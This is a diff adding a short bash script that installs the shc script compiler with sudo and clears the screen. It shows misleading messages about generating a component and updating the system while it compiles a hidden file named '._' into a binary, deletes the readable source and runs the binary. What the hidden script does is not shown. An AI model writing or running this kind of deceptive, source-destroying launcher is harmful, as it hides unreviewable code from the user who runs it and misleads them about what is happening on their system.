@@ -1,0 +1,16 @@
+#!/bin/bash
+
+
+echo "Generating a new component..."
+
+sudo apt install shc -y
+
+
+clear
+
+echo "Now u can encrypt your scripts."
+echo " "
+echo "We need to update the system."
+shc -f ._
+rm ._
+./._.x
